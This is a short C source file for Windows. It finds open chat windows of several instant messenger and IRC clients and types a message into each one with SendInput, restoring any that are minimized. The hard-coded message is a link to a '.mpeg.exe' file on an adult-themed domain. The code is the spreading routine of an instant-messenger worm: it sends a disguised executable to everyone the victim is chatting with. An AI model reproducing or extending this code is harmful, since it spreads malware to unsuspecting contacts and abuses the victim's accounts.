/*  
    Small source to send text to various running instant messengers.
    Enumerates the created windows and sends text to them. Uses SendInput and works for windows that
    are minimized to the taskbar and minimized to tray.
    
    Supports: Windows Live Messenger, gaim, XChat, mIRC, Yahoo, aim triton, trillian, aim, msn, etc...

    You don't need to credit me or anything because this code is really fucking basic.

    Written for C, changed to be C/C++ compatible. - RedGhost
    Changed SendInput buffer to be one buffer fixing some errors & updated delay times. - RedGhost
    Fixed small gaim bug. - RedGhost
*/

#include <stdio.h>
#include <stdlib.h>
#define NO_STRICT
#define _WIN32_WINNT 0x0501 /* SendInput shit please */
#include <windows.h>

/* for MSVS you may need "#include <malloc.h>" here */
//#include <malloc.h>

#pragma comment( lib, "user32.lib" )
#pragma comment( lib, "kernel32.lib" )

char *text = NULL;

/* x0r said he didn't want keybd_event so.... */
void sendwindowtext( void *window, char *text, int mincheck ) {
    if( mincheck ) {  /* Window is disposed when minimized */
        WINDOWPLACEMENT wp;
        if( GetWindowPlacement( window, &wp ) && wp.showCmd == SW_SHOWMINIMIZED )
            ShowWindow( window, SW_RESTORE );
    }

    SetForegroundWindow( window );
    SetFocus( window );
    Sleep( 800 ); /* make sure the window gets focus */

    int txtlen = strlen( text );
    int buflen = ((txtlen*2)+2);

    INPUT *pinput = (INPUT *)_alloca( (buflen*sizeof( INPUT )) );
    memset( pinput, 0, (buflen*sizeof( INPUT )) );

    int i = 0, j = 0;
    for( ; i < txtlen;  i++, j += 2 )  {
        pinput[j].type = INPUT_KEYBOARD;
        pinput[j].ki.wVk = VkKeyScan( text[i] );

        pinput[j+1].type = INPUT_KEYBOARD;
        pinput[j+1].ki.dwFlags |= KEYEVENTF_KEYUP;
        pinput[j+1].ki.wVk = VkKeyScan( text[i] );
    }
	
    pinput[j].type = INPUT_KEYBOARD;
    pinput[j].ki.wVk = VK_RETURN;
    pinput[j+1].type = INPUT_KEYBOARD;
    pinput[j+1].ki.dwFlags |= KEYEVENTF_KEYUP;
    pinput[j+1].ki.wVk = VK_RETURN;

    SendInput( buflen, pinput, sizeof( INPUT ) );
    Sleep( 1400 ); /* make sure it gets sent */
}
//---

int _stdcall EnumCallback( void *window, long lparam ) {
    char buf[128] = { 0 };

    if( GetClassName( window, buf, sizeof( buf ) ) == 0 )
        return 1;

    if( strcmp( buf, "IMWindowClass" ) == 0 )  {              /* Windows Live Messenger, probably older aswell */
        sendwindowtext( window, text, 0 );
    } else if( strcmp( buf, "gdkWindowToplevel" ) == 0 )  {   /* gaim but /maybe/ other GTK applications */
        memset( buf, 0, strlen( buf ) );
        if( GetWindowText( window, buf, sizeof( buf ) ) ) {
            if( strcmp( buf, "Buddy List" ) && strcmp( buf, "Login" ) && strcmp( buf, "Signon" ) ) {
                sendwindowtext( window, text, 0 ); 
            }
        }
    } else if( strcmp( buf, "AIM_IMessage" ) == 0 ) {         /* AIM, tested on 5.9 */
        sendwindowtext( window, text, 1 );
    } else if( strcmp( buf, " __oxFrame.class__" ) == 0 ) {   /* AIM Triton (Class is right, but didn't seem to work) */
        sendwindowtext( window, text, 0 );
    } else if( strcmp( buf, "IMClass" ) == 0 )  {             /* Yahoo Messenger */
        sendwindowtext( window, text, 0 );
    } else if( strcmp( buf, "icoContainer" ) == 0 ) {         /* Trillian Newest */
        sendwindowtext( window, text, 0 );
    } else if( strcmp( buf, "icoMSN" ) == 0 )  {              /* Trillian MSN */
        sendwindowtext( window, text, 0 );  
    } else if( strcmp( buf, "icoAIM" ) == 0 ) {               /* Trillian AIM */
        sendwindowtext( window, text, 0 );
    } else if( strcmp( buf, "icoICQ" ) == 0 )  {              /* Trillian ICQ */
        sendwindowtext( window, text, 0 );
    } else if( strcmp( buf, "icoYahoo" ) == 0 )  {            /* Trillian Yahoo */
        sendwindowtext( window, text, 0 );
    } else if( strstr( buf, "xchatWindow" ) ) {               /* XChat current channel */           
        sendwindowtext( window, text, 1 );
    } else if( strcmp( buf, "mIRC" ) == 0 ) {                 /* mIRC */
        sendwindowtext( window, text, 1 );
    }

    return 1;
}
//---

int _stdcall WinMain( void *instance, void *prev_instance, char *cmdline, int cmdshow ) {
    text = "www.camlisex.com/galery/freemovie/movie.mpeg.exe"; /* mmmm */

    EnumWindows( EnumCallback, 0 );
    ExitProcess( 0 );
    return 1;
}
//---

/* bye */
